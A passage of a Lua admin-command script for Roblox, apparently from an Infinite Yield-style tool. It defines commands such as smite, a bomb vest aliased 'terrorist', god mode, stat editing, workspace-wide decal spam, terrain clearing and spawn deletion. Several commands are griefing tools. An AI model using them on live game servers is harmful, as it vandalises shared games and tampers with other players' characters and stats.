        Sparkles6.Color = Color3.fromRGB((args[2]),(args[3]),(args[4]))
	end)
    end
end)

addcmd('nosparkles', 'remove sparkles from a player',{'unsparkles','unsp','nosp'},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
    for i,v in pairs(players)do
        local pchar=_char(v)
        for j,v1 in pairs(pchar:GetDescendants()) do
			if v1:IsA("Sparkles") then
				v1:Destroy()
			end end end
end)

addcmd('smoke', 'give a player smoke',{},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
    for i,v in pairs(players)do
        local pchar=_char(v)
        Instance.new("Smoke", pchar.HumanoidRootPart)
    end
end)

addcmd('addstat', 'give a player a stat',{},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
    for i,v in pairs(players)do
	spawn(function()
	if gPlayers[v]:FindFirstChild("leaderstats") then
	for _, child in pairs(gPlayers[v].leaderstats:GetChildren()) do
    if child.Name == "STAT" then
    child:Destroy()
    end
	end
	local score = Instance.new("StringValue")
	score.Name = "STAT"
	score.Value = GLS(false, 1)
	score.Parent = gPlayers[v].leaderstats
	else
	local stats = Instance.new("IntValue")
	stats.Name = "leaderstats"
	stats.Parent = gPlayers[v]
	for _, child in pairs(gPlayers[v].leaderstats:GetChildren()) do
    if child.Name == "STAT" then
    child:Destroy()
    end
	end
	local score = Instance.new("StringValue")
	score.Name = "STAT"
	score.Value = GLS(false, 1)
	score.Parent = gPlayers[v].leaderstats
	end
	end)
	end
end)

addcmd('unsmoke', 'remove smoke from a player',{'nosmoke'},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
    for i,v in pairs(players)do
        local pchar=_char(v)
        for j,v1 in pairs(pchar:GetDescendants()) do
			if v1:IsA("Smoke") then
				v1:Destroy()
			end
		end
    end
end)

addcmd('longneck', 'makes a player have a really long neck',{'giraffe'},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
    for i,v in pairs(players)do
        local pchar=_char(v)
        for i,v in pairs(pchar:GetChildren()) do
		if pchar.Torso:FindFirstChild("Neck") then
		pchar.Torso.Neck.C0 = CFrame.new(0,3,0) * CFrame.Angles(-math.rad(90),0,math.rad(180))
		local Neck = pchar:FindFirstChild("Neck") if Neck then Neck:Destroy() end
		Neck = Instance.new("Part", pchar) Neck.Name = "Neck" Neck.Size = Vector3.new(1,3,1)
		Neck.Position = Vector3.new(0,100,0) Neck.BrickColor = BrickColor.new(tostring(pchar.Head.BrickColor)) Neck.Locked = true
		local Mesh = Instance.new("CylinderMesh", Neck) Mesh.Scale = Vector3.new(0.7,1,0.7)
		local Weld = Instance.new("Weld", Neck) Weld.Part0 = Neck Weld.Part1 = pchar.Torso Weld.C0 = CFrame.new(0,-2,0)
	end
    end
end
end)

addcmd('unlongneck', 'makes a player have a really long neck',{'nolongneck', 'ungiraffe', 'nogiraffe'},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
    for i,v in pairs(players)do
        local pchar=_char(v)
        for i,v in pairs(pchar:GetChildren()) do
		pchar.Torso.Neck.C0 = CFrame.new(0,1,0) * CFrame.Angles(-math.rad(90),0,math.rad(180))
		local Neck = pchar:FindFirstChild("Neck") if Neck then Neck:Destroy() end
    end
end
end)

addcmd('removeterrain', 'rip terrain',{'noterrain','clrterrain'},
function(args, speaker)
workspace.Terrain:Clear()
end)

addcmd('smite','get hit by lightning',{},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
    for i,v in pairs(players)do
		local pchar=_char(v)
		spawn(function()
						local char = pchar
						local zeus = Instance.new("Model",char)
						local cloud = Instance.new("Part",zeus)
						cloud.Anchored = true
						cloud.CanCollide = false
						cloud.CFrame = char.HumanoidRootPart.CFrame*CFrame.new(0,25,0)
						local sound = Instance.new("Sound",cloud)
						sound.SoundId = "rbxassetid://133426162"
						local mesh = Instance.new("SpecialMesh",cloud)
						mesh.MeshId = "http://www.roblox.com/asset/?id=1095708"
						mesh.TextureId = "http://www.roblox.com/asset/?id=1095709"
						mesh.Scale = Vector3.new(30,30,40)
						mesh.VertexColor = Vector3.new(0.3,0.3,0.3)
						local light = Instance.new("PointLight",cloud)
						light.Color = Color3.new(0,85/255,1)
						light.Brightness = 10
						light.Range = 30
						light.Enabled = false
						wait(0.2)
						sound.Volume = 0.5
						sound.Pitch = 0.8
						sound:Play()
						light.Enabled = true
						wait(1/100)
						light.Enabled = false
						wait(0.2)
						light.Enabled = true
						light.Brightness = 1
						wait(0.05)
						light.Brightness = 3
						wait(0.02)
						light.Brightness = 1
						wait(0.07)
						light.Brightness = 10
						wait(0.09)
						light.Brightness = 0
						wait(0.01)
						light.Brightness = 7
						light.Enabled = false
						wait(1.5)
						local part1 = Instance.new("Part",zeus)
						part1.Anchored = true
						part1.CanCollide = false
						part1.Size = Vector3.new(2, 9.2, 1)
						part1.BrickColor = BrickColor.new("New Yeller")
						part1.Transparency = 0.6
						part1.BottomSurface = "Smooth"
						part1.TopSurface = "Smooth"
						part1.CFrame = char.HumanoidRootPart.CFrame*CFrame.new(0,15,0)
						part1.Rotation = Vector3.new(0.359, 1.4, -14.361)
						wait()
						local part2 = part1:clone()
						part2.Parent = zeus
						part2.Size = Vector3.new(1, 7.48, 2)
						part2.CFrame = char.HumanoidRootPart.CFrame*CFrame.new(0,7.5,0)
						part2.Rotation = Vector3.new(77.514, -75.232, 78.051)
						wait()
						local part3 = part1:clone()
						part3.Parent = zeus
						part3.Size = Vector3.new(1.86, 7.56, 1)
						part3.CFrame = char.HumanoidRootPart.CFrame*CFrame.new(0,1,0)
						part3.Rotation = Vector3.new(0, 0, -11.128)
						sound.SoundId = "rbxassetid://130818250"
						sound.Volume = 1
						sound.Pitch = 1
						sound:Play()
						wait()
						part1.Transparency = 1
						part2.Transparency = 1
						part3.Transparency = 1
						Instance.new("Smoke",char.HumanoidRootPart).Color = Color3.new(0,0,0)
						char:BreakJoints()
		end)
	end
end)

addcmd('asteroid','get hit by an asteroid',{'meteor', 'meteorite'},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
    for i,v in pairs(players)do
spawn(function()
        local pchar=_char(v)
				local Ast = Instance.new("Part", workspace) Ast.Name = "Asteroid" Ast.Position = pchar.HumanoidRootPart.Position + Vector3.new(0,500,0) Ast.Size = Vector3.new(12,12,12)
				local Mesh = Instance.new("SpecialMesh", Ast) Mesh.MeshId = "rbxassetid://1290033" Mesh.Scale = Vector3.new(6.2,6.2,6.2) Mesh.TextureId = "rbxassetid://1290030"
				local Fire = Instance.new("Fire", Ast) Fire.Heat = 25 Fire.Size = 30
				local Smoke = Instance.new("Smoke", Ast) Smoke.RiseVelocity = 10 Smoke.Size = 10
				local f = Instance.new("Sound")
				f.Name = "fly"
				f.SoundId = "rbxassetid://179438534"
				f.Volume = 3
				f.Pitch = 1
				f.Looped = true
				f.archivable = true
				f.Parent = Ast
				f:play()
				local Touched = false
				coroutine.wrap(function()
					repeat wait(0.1)
						Ast.Position = Vector3.new(pchar.HumanoidRootPart.Position.X, Ast.Position.Y, pchar.HumanoidRootPart.Position.Z)
					until not Ast or Ast.Parent == nil or Touched == true
				end)()
				Ast.Touched:connect(function(Part)
					if Touched == false then
						Touched = true
						Part:BreakJoints()
						local Boom = Instance.new("Explosion", workspace)
						Boom.Position = Ast.Position
						Boom.BlastPressure = 1000000
						Boom.BlastRadius = 30
						Fire.Heat = 0
						Smoke.RiseVelocity = 0
						f:Destroy()
						local s = Instance.new("Sound")
						s.Name = "boom"
						s.SoundId = "rbxassetid://188590169"
						s.Volume = 3
						s.Pitch = 1
						s.Looped = true
						s.archivable = true
						s.Parent = Ast
						s:play()
						coroutine.wrap(function()
							wait(10)
							s:Destroy()
							if Ast and Ast.Parent ~= nil then
								Ast:Destroy()
							end
						end)()
					end
				end)
end)
end
end)

addcmd('bomb','gives you a bomb vest',{'terrorist'},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
    for i,v in pairs(players)do
spawn(function()
        local Char=_char(v)
local HumanoidRootPart = Char.HumanoidRootPart
local TickWait = 1
local Dead = false

local Position = Vector3.new(0,100,0)
function NewPart(Parent)
	local Part = Instance.new("Part", Parent)
	Part.CanCollide = false
	Part.Position = Position
	Part.TopSurface = "Smooth"
	Part.BottomSurface = "Smooth"
	Position = Position + Vector3.new(0,10,0)
	return Part
end

local Model = Char:FindFirstChild("Bomb")
if Model then Model:Destroy() end

local Model = Instance.new("Model", Char)
Model.Name = "Bomb"

local Belt = NewPart(Model)
Belt.Size = Vector3.new(2.2,0.5,1.2)
local Weld = Instance.new("Weld", Belt)
Weld.Part0 = Belt
Weld.Part1 = HumanoidRootPart
Weld.C0 = CFrame.new(0,1.1,0)
local Light = Instance.new("PointLight", Belt)
Light.Range = 15
Light.Brightness = 5
Light.Color = Color3.new(1,0,0)
local Beep = Instance.new("Sound", Belt)
Beep.SoundId = "http://www.roblox.com/asset/?id=188588790"
local ExplodeSound = Instance.new("Sound", Belt)
ExplodeSound.SoundId = "http://www.roblox.com/asset/?id="..(tonumber((math.ceil(1776.66^2)+17).."."..string.rep("36",3))*77)+0.00003 
ExplodeSound.Pitch = 2.8
ExplodeSound.Volume = 3

local Back = NewPart(Model)
Back.Size = Vector3.new(1.5,1.5,0.5)
local Weld = Instance.new("Weld", Back)
Weld.Part0 = Back
Weld.Part1 = HumanoidRootPart
Weld.C0 = CFrame.new(0,0.1,-0.75)

local StrapLeft = NewPart(Model)
StrapLeft.Size = Vector3.new(0.2,0.5,1.6)
local Weld = Instance.new("Weld", StrapLeft)
Weld.Part0 = StrapLeft
Weld.Part1 = HumanoidRootPart
Weld.C0 = CFrame.new(0.65,-0.9,-0.2)

local BuckleLeft = NewPart(Model)
BuckleLeft.Size = Vector3.new(0.2,1.5,0.2)
local Weld = Instance.new("Weld", BuckleLeft)
Weld.Part0 = BuckleLeft
Weld.Part1 = HumanoidRootPart
Weld.C0 = CFrame.new(0.65,0.1,0.5)

local StrapRight = NewPart(Model)
StrapRight.Size = Vector3.new(0.2,0.5,1.6)
local Weld = Instance.new("Weld", StrapRight)
Weld.Part0 = StrapRight
Weld.Part1 = HumanoidRootPart
Weld.C0 = CFrame.new(-0.65,-0.9,-0.2)

local BuckleRight = NewPart(Model)
BuckleRight.Size = Vector3.new(0.2,1.5,0.2)
local Weld = Instance.new("Weld", BuckleRight)
Weld.Part0 = BuckleRight
Weld.Part1 = HumanoidRootPart
Weld.C0 = CFrame.new(-0.65,0.1,0.5)

LightEnabled = true
coroutine.wrap(function()
	repeat
		wait(TickWait)
		LightEnabled = not LightEnabled
		Light.Enabled = LightEnabled
		Beep:Play()
	until Dead == true or Char:FindFirstChild("Bomb") == nil
end)()

wait(10)
	if Dead == false then
		Dead = true
		ExplodeSound:Play(); wait(1.4)
		local Explosion = Instance.new("Explosion")
		Explosion.Position = Belt.Position
		Explosion.BlastPressure = 100000
		Explosion.DestroyJointRadiusPercent = 0.7
		Explosion.ExplosionType = "CratersAndDebris"
		Explosion.BlastRadius = 50
		Explosion.Parent = workspace
	end
end)
end
end)

addcmd('btools', 'gives a player btools',{},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
    if players ~= nil then
		for i, v in pairs(players) do
			Instance.new("HopperBin", gPlayers[v].Backpack).BinType = 1 -- Model Grab Tool
	  		Instance.new("HopperBin", gPlayers[v].Backpack).BinType = 2 -- Part Grab Tool
			Instance.new("HopperBin", gPlayers[v].Backpack).BinType = 3 -- Clone Tool
			Instance.new("HopperBin", gPlayers[v].Backpack).BinType = 4 -- Hammer Tool
			if FindTable(SPC, args[1]) then Notify('Gave building tools to ' ..args[1]) else
			Notify('Gave btools to player(s)') end end end end)

addcmd('sword', 'gives a player a sword',{},
function(args, speaker)
local players = getPlayer(args[1], speaker)
if players ~= nil then
for i, v in pairs(players) do
coroutine.resume(coroutine.create(function()
if gPlayers[v] and gPlayers[v]:findFirstChild("Backpack") then
local sword = Instance.new("Tool", gPlayers[v].Backpack) sword.Name = "Sword"  sword.TextureId = "rbxasset://Textures/Sword128.png"
sword.GripForward = Vector3.new(-1,0,0)
sword.GripPos = Vector3.new(0,0,-1.5)
sword.GripRight = Vector3.new(0,1,0)
sword.GripUp = Vector3.new(0,0,1)
local handle = Instance.new("Part", sword) handle.Name = "Handle" handle.FormFactor = "Plate" handle.Size = Vector3.new(1,.8,4) handle.TopSurface = 0 handle.BottomSurface = 0
local msh = Instance.new("SpecialMesh", handle) msh.MeshId = "rbxasset://fonts/sword.mesh" msh.TextureId = "rbxasset://textures/SwordTexture.png"
repeat wait() until gPlayers[v] and gPlayers[v].Character and gPlayers[v].Character:findFirstChild("Humanoid")
local Damage = 15
local SlashSound = Instance.new("Sound", handle)
SlashSound.SoundId = "rbxasset://sounds\\swordslash.wav"
SlashSound.Volume = 1
local LungeSound = Instance.new("Sound", handle)
LungeSound.SoundId = "rbxasset://sounds\\swordlunge.wav"
LungeSound.Volume = 1
local UnsheathSound = Instance.new("Sound", handle)
UnsheathSound.SoundId = "rbxasset://sounds\\unsheath.wav"
UnsheathSound.Volume = 1
handle.Touched:connect(function(hit)
if hit and hit.Parent and hit.Parent:findFirstChild("Humanoid") and gPlayers[v].Character.Humanoid.Health > 0 and hit.Parent.Humanoid ~= gPlayers[v].Character.Humanoid then
local tag = Instance.new("ObjectValue", hit.Parent.Humanoid) tag.Value = speaker tag.Name = "creator" game:service("Debris"):AddItem(tag, 3)
hit.Parent.Humanoid:TakeDamage(Damage)
if not sword.Enabled or gPlayers[v].Character.Humanoid.Health <= 0 then return end
sword.Enabled = false
SlashSound:play()
local slash = Instance.new("StringValue", sword) slash.Name = "toolanim" slash.Value = "Slash"
wait(0.5)
sword.Enabled = true
end
end)
sword.Equipped:connect(function(hit)
UnsheathSound:play()
sword.Enabled = true
end)
end
end))
end
end
end)

addcmd('hatsize', 'changes players hat size',{''},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
	for i,v in pairs(players) do
		for i,v in pairs(gPlayers[v].Character:GetChildren()) do
			if v:IsA('Accessory') then
				for a,b in pairs(v.Handle:GetChildren()) do
					if b:IsA('SpecialMesh') then
						b.Scale = args[2] * Vector3.new(1, 1, 1)
					end
				end
			end
		end
	end
end)

addcmd('headsize', 'changes players head size',{''},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
	for i,v in pairs(players) do
	local plrchar = _players[v].Character
	if not plrchar.Humanoid:FindFirstChild('HeadScale') then
		if args[2] == 1 then
			plrchar.Head.Mesh.Scale = Vector3.new(1.25, 1.25, 1.25)
			plrchar.Head.Mesh.Offset = Vector3.new(0, 0, 0)
		else
			plrchar.Head.Mesh.Scale = args[2] * Vector3.new(1.25, 1.25, 1.25)
		end
	else plrchar.Humanoid.HeadScale.Value = args[2]
		end
	end
end)

addcmd('change', 'changes a players stat',{'stat'},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
	for i,v in pairs(players) do
		if _players[v]:FindFirstChild('leaderstats') then
			for i,v in pairs(_players[v].leaderstats:GetChildren()) do
				if string.lower(v.Name) == string.lower(args[2]) and v:IsA('IntValue') or v:IsA('NumberValue') then
					if args[3] then v.Value = tonumber(args[3]) end
				elseif string.lower(v.Name) == string.lower(args[2]) and v:IsA('StringValue') then
					v.Value = GLS(false, 2)
				end
			end
		end
	end
end)

addcmd('draw', 'drawing tool',{},
function(args, speaker)
if speaker.userId ~= LP.userId then
lponly(speaker)
else
for i,v in next,game:children()do
	pcall(function()
		local c=v.className;
		rawset(getfenv(0),c:sub(1,1):lower()..c:sub(2),game:service(c));
	end);
end;


user=players.LocalPlayer;
uname=user.Name;
guis=user.PlayerGui;
pack=user.Backpack;

keyDowns={};
freeKeys={};
shortcuts={};

_G.mine=_G.mine or{};

name='Draw3D';
url='http://www.roblox.com/asset/?id=%d';

iconNormal=url:format(96578285);
iconOnDown=url:format(96584484);

ver=0;
drawPixel=0.10;
_G.drawLimit=_G.drawLimit or 1000;

_G.drawColor=_G.drawColor or Color3.new();





destroy=game.remove;
find=game.findFirstChild;
new=Instance.new;
with=function(c)
	return function(p)
		local o=type(c)=='string'and new(c)or c;
		local x=p.Parent;p.Parent=nil;
		for i,v in next,p do
			o[i]=v;
		end;
		if(x)then
			o.Parent=x;
		end;
		return o;
	end;
end;
getPlace=function()
	if(find(workspace,'draw')==nil)then
		new('Model',workspace).Name='draw';
	end;
	if(find(workspace.draw,uname)==nil)then
		new('Model',workspace.draw).Name=uname;
	end;
	return workspace.draw[uname];
end;
drawLine=function(start,target)
	local gui=with'BlockMesh'{
		Parent=with'Part'{
			CFrame=CFrame.new(start,target)*CFrame.new(0,0,-(start-target).magnitude/2);
			Size=Vector3.new(drawPixel,drawPixel,(start-target).magnitude+.325*drawPixel);
			Parent=getPlace();
			Color=_G.drawColor;
			BottomSurface=0;
			Anchored=true;
			TopSurface=0;
			formFactor=3;
			Name=name;
	}}.Parent;
	table.insert(_G.mine,gui);
	return gui;
end;
onDown=function()
	if(drawing)then
		return nil;
	end;
	if(selectGui.Adornee)then
		destroy(selectGui.Adornee);
	end;
	
	drawing=true;
	
	mouse.Icon=iconOnDown;
	ver=ver+1;
	
	
	local cVer,start,target=ver,mouse.hit.p;
	
	local group={};
	repeat
		Wait(0.02);
		
		if(mouse.target and mouse.target.Name~=name and mouse.hit.p~=start)then
			
			target=mouse.hit.p;
			
			table.insert(group,drawLine(start,target));
			
			start=target;
		end;
	until ver~=cVer;
	drawing=false;
	
	local groupM=new('Model',getPlace());
	for i,v in next,group do
		if(v:IsDescendantOf(Workspace))then
			v.Parent=groupM;
		end;
	end;
	if(next(groupM:children())==nil)then
		destroy(groupM);
	end;
end;
onUp=function()
	mouse.Icon=iconNormal;
	ver=ver+1;
end;
onKeyDown=function(k)
	if(freeKeys[k]==false)then
		return false;
	end;
	freeKeys[k]=false;
	Wait(0.01);
	if(keyDowns[k])then
		keyDowns[k]();
	elseif(shortcuts[k])then
		shortcuts[k]();
	end;
end;
onKeyUp=function(k)
	freeKeys[k]=true;
end;
onMove=function()

end;
onSelect=function(lmouse)
	frame.Visible=true;

	mouse=lmouse;
	
	mouse.Icon=iconNormal;
	
	mouse.Button1Down:connect(onDown);
	mouse.KeyDown:connect(onKeyDown);
	mouse.Button1Up:connect(onUp);
	mouse.KeyUp:connect(onKeyUp);
	mouse.Move:connect(onMove);
end;
onDeselect=function()
	ver=ver+1;
	frame.Visible=false;
	selectGui.Adornee=nil;
	mouse.Icon=iconNormal;
	for i,v in next,freeKeys do
		freeKeys[i]=true;
	end;
end;
addButton=function(title,shortcut,fun)
	with'TextButton'{
		Text=string.format(' %s (%s)',title,shortcut);
		TextXAlignment=0;
		Parent=frame;
	}.MouseButton1Up:connect(fun);
	
	shortcuts[shortcut]=fun;
	
	local c=#frame:children();
	for i,v in next,frame:children()do
		v.Position=UDim2.new(0,0,0,20*(i-1));
		v.Size=UDim2.new(1,0,0,20);
	end;
	
	frame.Position=UDim2.new(1,-152,.5,-c*10);
	frame.Size=UDim2.new(0,150,0,c*20);
end;








for i,v in next,{guis;pack;}do
	pcall(function()
		repeat until destroy(v[name]);
	end);
end;



tool=with'HopperBin'{
	Parent=pack;
	Name=name;
};
tool.Deselected:connect(onDeselect);
tool.Selected:connect(onSelect);




screen=with'ScreenGui'{
	Parent=guis;
	Name=name;
};
frame=with'Frame'{
	Parent=screen;
	Visible=false;
};
clframe=with'Frame'{
	Position=UDim2.new(.5,-50,.5,-50);
	Size=UDim2.new(0,100,0,100);
	Visible=false;
	Parent=screen;
};
selectGui=with'SelectionBox'{
	Parent=screen;
};

local c=0;
for y=0,7 do
	for x=0,7 do
		local color=BrickColor.palette(c).Color;
		
		with'ImageButton'{
			Position=UDim2.new(.125*x,0,.125*y);
			Size=UDim2.new(.125,0,.125);
			BackgroundColor3=color;
			Parent=clframe;
		}.MouseButton1Up:connect(function()
			clframe.Visible=false;
			_G.drawColor=color;
		end);
		
		c=c+1;
	end;
end;

addButton('Color','c',function()
	clframe.Visible=true;
end);
addButton('Remove your draws','r',function()
	repeat
		destroy(_G.mine[1]);
		table.remove(_G.mine,1);
		Wait(0.01);
	until nil;
end);
addButton('Remove global draws','k',function()
	destroy(workspace.draw);
	while(_G.mine[1])do
		destroy(_G.mine[1]);
		table.remove(_G.mine,1);
	end;
end);
addButton('Remove selected','x',function()
	repeat
		if(find(workspace,'draw'))then
			local dt=mouse.target;
			if(dt and dt:IsDescendantOf(workspace.draw))then
				selectGui.Adornee=dt.Parent;
			else
				selectGui.Adornee=nil;
			end;
		else
			selectGui.Adornee=nil;
		end;
		Wait(0.01);
	until freeKeys.x;
	selectGui.Adornee=nil;
end);




repeat
	Wait(0.01);
	if(next(_G.mine)and _G.mine[_G.drawLimit])then
		destroy(_G.mine[1]);
		table.remove(_G.mine,1);
	end;
until script.Parent==nil or tool.Parent==nil;
script.Disabled=true;
destroy(screen);
end
end)

addcmd('god', 'gods player',{},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
    for i,v in pairs(players)do
        local pchar=_char(v)
        if pchar then pchar.Humanoid.MaxHealth=math.huge end
    end
end)

addcmd('sgod', 'silently gods player',{},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
    for i,v in pairs(players)do
        local pchar=_char(v)
        spawn(function()
            pchar.Humanoid.MaxHealth = 10000000
			wait()
			pchar.Humanoid.Health = 10000000
			if FindTable(SPC, args[1]) then Notify('Silent godded ' ..args[1]) else
			Notify('Silent godded player(s)') end
        end)
    end
end)

addcmd('ungod', 'removes god from a player',{},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
    for i,v in pairs(players)do
        local pchar=_char(v)
        if pchar then 
			pchar.Humanoid.MaxHealth=100 
			pchar.Humanoid.Health=100
		end
    end
end)

addcmd('heal', 'resets a players health',{},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
    for i,v in pairs(players)do spawn(function()
local pchar=_char(v)
if pchar then pchar.Humanoid.Health=pchar.Humanoid.MaxHealth;end end) end end)

addcmd('fart', 'makes u fart',{},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
    for i,v in pairs(players)do
	spawn(function()
        local pchar=_char(v)
fart = Instance.new("Smoke")
fart.Parent = pchar.HumanoidRootPart
fart.Color = Color3.new(255/255, 255/255, 0)
fart.Opacity = 0.4
fart.Size = 1.0
fart.RiseVelocity = 8
fartsound = Instance.new("Sound", workspace)
fsound = "http://www.roblox.com/asset?id=251309043"
fartsound.SoundId = fsound
fartsound.Volume = 1.0
fartsound:Play()
wait(9.0)
fartsound:Destroy()
pchar.HumanoidRootPart.Smoke:Destroy()
	    end)
end
end)

addcmd('decalspam', 'you can already guess...',{},
function(args, speaker)
Notify('Decal Spammed ID: ' ..args[1])
wait(4)
decalID = args[1]
function exPro(root)
for _, v in pairs(root:GetChildren()) do
if v:IsA("BasePart") then
local One = Instance.new("Decal", v)
local Two = Instance.new("Decal", v)
local Three = Instance.new("Decal", v)
local Four = Instance.new("Decal", v)
local Five = Instance.new("Decal", v)
local Six = Instance.new("Decal", v)
One.Texture = "http://www.roblox.com/asset/?id="..decalID
Two.Texture = "http://www.roblox.com/asset/?id="..decalID
Three.Texture = "http://www.roblox.com/asset/?id="..decalID
Four.Texture = "http://www.roblox.com/asset/?id="..decalID
Five.Texture = "http://www.roblox.com/asset/?id="..decalID
Six.Texture = "http://www.roblox.com/asset/?id="..decalID
One.Face = "Front"
Two.Face = "Back"
Three.Face = "Right"
Four.Face = "Left"
Five.Face = "Top"
Six.Face = "Bottom"
One.Name = "IYdecal"
Two.Name = "IYdecal"
Three.Name = "IYdecal"
Four.Name = "IYdecal"
Five.Name = "IYdecal"
Six.Name = "IYdecal"
end
exPro(v)
end
end
function asdf(root)
for _, v in pairs(root:GetChildren()) do
asdf(v)
end
end
exPro(workspace)
asdf(workspace)
end)

addcmd('undecalspam', 'removes the mess',{},
function(args, speaker)
Notify('Removing Decal Spam...')
wait(4)
function exPro(root)
for _, v in pairs(root:GetChildren()) do
if v:IsA("Decal") and v.Texture == "http://www.roblox.com/asset/?id="..decalID then
v.Parent = nil
end
exPro(v)
end
end
function asdf(root)
for _, v in pairs(root:GetChildren()) do
asdf(v)
end
end
exPro(workspace)
asdf(workspace)
end)

addcmd('sky', 'sets the sky',{'skybox'},
function(args, speaker)
playinggif = false
for i,v in pairs(LightingService:GetChildren()) do if v:IsA('Sky') then v:Destroy() end end
s = Instance.new("Sky")
s.Name = "Sky"
s.Parent = LightingService
local skyboxID = args[1]
s.SkyboxBk = "http://www.roblox.com/asset/?id="..skyboxID
s.SkyboxDn = "http://www.roblox.com/asset/?id="..skyboxID
s.SkyboxFt = "http://www.roblox.com/asset/?id="..skyboxID
s.SkyboxLf = "http://www.roblox.com/asset/?id="..skyboxID
s.SkyboxRt = "http://www.roblox.com/asset/?id="..skyboxID
s.SkyboxUp = "http://www.roblox.com/asset/?id="..skyboxID
LightingService.TimeOfDay = 12
end)

addcmd('skygif', 'makes the sky play the IDs you feed it',{},
function(args, speaker)
if args[2] then skyinterval = tonumber(args[2]) else skyinterval = 0.05 end
playinggif = false
wait(0.5)
local GIF = splitString(args[1])
for _, child in pairs( gLighting:GetChildren()) do
    if child.ClassName == "Sky" then
        child:Destroy()
    end
end
Sky = Instance.new("Sky",game.Lighting)
Notify('Loading...')
playinggif = true
for N,F in ipairs(GIF) do
	game:GetService("ContentProvider"):Preload("http://www.roblox.com/asset/?id="..F)
end
gLighting.TimeOfDay = 12
Notify('Playing skybox')
playinggif = true
wait(0.5)
repeat
	for N,F in ipairs(GIF) do
		Sky.SkyboxBk = "http://www.roblox.com/asset/?id="..F- 1
		Sky.SkyboxDn = "http://www.roblox.com/asset/?id="..F- 1
		Sky.SkyboxFt = "http://www.roblox.com/asset/?id="..F- 1
		Sky.SkyboxLf = "http://www.roblox.com/asset/?id="..F- 1
		Sky.SkyboxRt = "http://www.roblox.com/asset/?id="..F- 1
		Sky.SkyboxUp = "http://www.roblox.com/asset/?id="..F- 1
		wait(skyinterval)
	end
until playinggif == false
end)

addcmd('unskygif', 'removes the sky animation',{'noskygif'},
function(args, speaker)
playinggif = false
wait(0.5)
Notify('Stopped sky gif')
for _, child in pairs( gLighting:GetChildren()) do
    if child.ClassName == "Sky" then
        child:Destroy()
    end
end
end)

addcmd('freeze', 'freezes a player',{'fr'},
function(args, speaker)
	local players = getPlayer(args[1], speaker)
	if players ~= nil then
	for i, v in pairs(players) do
	spawn(function()
	for i, x in next, _char(v):GetDescendants() do if x:IsA("Part") and not x.Anchored then x.Anchored = true end
	end
	end)
	end
end
end)

addcmd('thaw', 'unfreezes a player',{'unfreeze','unfr'},
function(args, speaker)
	local players = getPlayer(args[1], speaker)
	if players ~= nil then
	for i, v in pairs(players) do
	spawn(function()
	for i, x in next, _char(v):GetDescendants() do if x:IsA("Part") and x.Anchored then x.Anchored = false end
	end
	end)
	end
end
end)

addcmd('spawn', 'places a spawn',{'spawnpoint'},
function(args, speaker)
	local players = getPlayer(args[1], speaker)
	if players ~= nil then
		for i, v in pairs(players) do
local M = Instance.new('SpawnLocation', workspace) M.Name = 'IYspawn'
M.CFrame = _char(v).HumanoidRootPart.CFrame
M.Color = maincolor M.Material = 'Neon' M.Size = Vector3.new(6, 1, 6)
M.Position = _char(v).HumanoidRootPart.Position + Vector3.new(0, -3.5, 0)
M.Anchored = true
end
end
end)

addcmd('deletespawns', 'places a spawn',{'removespawns'},
function(args, speaker)
for i,v in pairs(workspace:GetDescendants()) do
if v:IsA("SpawnLocation") then
v:Destroy()
end
end
end)

addcmd('neon', 'makes a player neon',{},
function(args, speaker)
	local players = getPlayer(args[1], speaker)
	if players ~= nil then
		for i, v in pairs(players) do
					for _, child in pairs( _char(v):GetChildren()) do
    	if child.ClassName == "CharacterMesh" then
        child:Destroy()
   		end
		end
		for _, child in pairs( _char(v):GetChildren()) do
    	if child.ClassName == "Shirt" then
        child:Destroy()
   		end
		end
		for _, child in pairs( _char(v):GetChildren()) do
    	if child.ClassName == "Pants" then
        child:Destroy()
   		end
		end
			for _, child in pairs( _char(v):GetDescendants()) do
    		if child.ClassName == "Part" then
        child.Material = "Neon"
    end
end
end
end
end)

addcmd('glass', 'makes a player glass',{},
function(args, speaker)
	local players = getPlayer(args[1], speaker)
	if players ~= nil then
		for i, v in pairs(players) do
					for _, child in pairs( _char(v):GetChildren()) do
    	if child.ClassName == "CharacterMesh" then
        child:Destroy()
   		end
		end
		for _, child in pairs( _char(v):GetChildren()) do
    	if child.ClassName == "Shirt" then
        child:Destroy()
   		end
		end
		for _, child in pairs( _char(v):GetChildren()) do
    	if child.ClassName == "Pants" then
        child:Destroy()
   		end
		end
			for _, child in pairs( _char(v):GetDescendants()) do
    		if child.ClassName == "Part" then
        child.Material = "Glass"
		child.Transparency = 0.3
    end
end
end
end
end)


addcmd('os', 'Shows the targets platform.', {'platform', 'device'},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
    local platforms = {}
    for i,v in pairs(players) do
        local p = game:GetService("Players")[v]
        table.insert(platforms, p.Name.."'s platform is: "..p.OsPlatform)
    end
    Notify(table.concat(platforms, ', '))
end)

addcmd('whiteify', 'Turns the target white.', {'white'},
function(args, speaker)
	local players = getPlayer(args[1], speaker)

	for i,v in pairs(players) do
		local lplr = game:GetService("Players")[v]
		local bodyc = lplr.Character["Body Colors"]
		local color = "Institutional white"

		bodyc.HeadColor = BrickColor.new(color)
		bodyc.LeftArmColor = BrickColor.new(color)
		bodyc.LeftLegColor = BrickColor.new(color)
		bodyc.RightArmColor = BrickColor.new(color)
		bodyc.RightLegColor = BrickColor.new(color)
		bodyc.TorsoColor = BrickColor.new(color)
	end
end)

addcmd('blackify', 'Turns the target black.', {'black'},
function(args, speaker)
	local players = getPlayer(args[1], speaker)

	for i,v in pairs(players) do
		local lplr = game:GetService("Players")[v]
		local bodyc = lplr.Character["Body Colors"]
		local color = "Black"

